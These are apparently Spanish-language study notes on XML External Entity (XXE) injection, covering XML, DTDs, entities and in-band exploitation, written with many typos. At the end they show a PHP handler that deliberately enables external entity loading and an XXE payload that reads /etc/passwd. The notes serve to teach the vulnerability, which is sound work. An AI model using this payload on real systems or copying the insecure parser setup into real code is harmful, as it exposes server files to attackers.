# Introducción

XXE (XML External Entity) Es un tipo de injección que explota las vulnerabilidades de una aplicacion via XML. Esto occure cuando la apclicacion acpeta un input XML inclute entidades external. Los atacantes pueden acceder a archivos locales, hacer consultas al servidor, o ejecutar código remoto.

## Objetivos

- Reconocer los conceptos fundamentales y peligrosos asociadas a la injección XXE
- Identificar Vulnerabilidades XXE procesar configuraciones y practicas
- Desarrollar técnicas de deteccion, explotación y mitigación de dicha vulnerabilidad

# Explorar XML

XML (Extensible Markup Language) Es un lenguaje de amrgado de SGML (Standart Generalized Markup Language) tiene la misma base del estándar HTML. Normalmente usado en aplicaciones para guardar y tansportar datos en formato de lectua humano. 

## Sintaxis y Estructura

```
<?xml version="1.0" encoding="UTF-8"?>
<user id="1">
   <name>John</name>
   <age>30</age>
   <address>
      <street>123 Main St</street>
      <city>Anytown</city>
   </address>
</user>
```

## XSLT

XSLT (Exstensible Stylesheet Language Transformation) Es un lenguaje usado para transformar en documentos XML. Mientras XSLT es normalmente usado para transformar datos y formatting. 

Se usa para:

1.Data Extraction
2.Entity Expansion
3.Data Manipulation
4.Blind XXE

## Que son los DTDs

DTDs o Document Type Definitions definen la estructura y construcción de un documentos XML. Ellos especifical los elementos, atributos, y relaciones entre ellos. 

Proposito:

- Validacion
- Enity Declaration

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE config [
<!ELEMENT config (database)>
<!ELEMENT database (username, password)>
<!ELEMENT username (#PCDATA)>
<!ELEMENT password (#PCDATA)>
]>
<config>
<!-- configuration data -->
</config>
```

## DTDs y XXE

DTds Juegan un papel crucial en las injecciones XXE, ellos son los que declaran las entidades external. Se refieren a archivos externos o URLs

## Entidades XML

Son los que gaurdan los datos o cóidgo que se expanden con el documento XML. Hay 5 tipos de entidades:internas, external, parametrales, generales y caracteres

```
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY external SYSTEM "http://example.com/test.dtd">
<config>
&external;
</config>
```

![image](https://github.com/user-attachments/assets/adea0416-6dec-4a29-afaa-245fc3a4c188)

# XML Mecanismos de análisis

Es el proceso que hace XML para leer un arcivo, esta iformación es accesible y manipulable con el software del programa. SML convierte los datos del formato XML dentro de la estructura del programa como por ejemplo (DOM tree). Durante el proceso, se valida los datos XML con un esquema, asegurandose que una estructura contiene las reglas.

Si un mecanismo es configurado con un proceso externo, hay que tener autorizació nde acceso al archivo, sistemas internos o páginas externas.

## COmmon XML Mecanismos

- DOM: (Document Object Model)
- SAX (Simple API for XML)
- StaX (Streaming API for XML)
- Xpath Parser

# Explotar XXE- In-Band

## In-Band vs Out-Of-Band

IN-band XXE se refiere a vulnerabilidades cuando el atacante ve la respuesta del servidor. Esto da casos de filtración de datos y explotación. Los atacatantes mandan código malicoso a la aplicación, el servidor puede responder con los datos extraidor o resultado de lataque

Out-of-band es la otra cara, se refiere a una vulnerablidad donde el atacante no puede ver la respuesta de lservidor.

## In-Band Explotation

![image](https://github.com/user-attachments/assets/f1b06619-a7d3-4a9e-aa06-9fc5bec2fb50)

![image](https://github.com/user-attachments/assets/88e84c62-eab4-49b2-86f4-6043fe85c2be)

```
libxml_disable_entity_loader(false);

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $xmlData = file_get_contents('php://input');

    $doc = new DOMDocument();
    $doc->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD); 

    $expandedContent = $doc->getElementsByTagName('name')[0]->textContent;

    echo "Thank you, " .$expandedContent . "! Your message has been received.";
}
```

```
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<contact>
<name>&xxe;</name>
<email>test@test.com</email>
<message>test</message>
</contact>
```


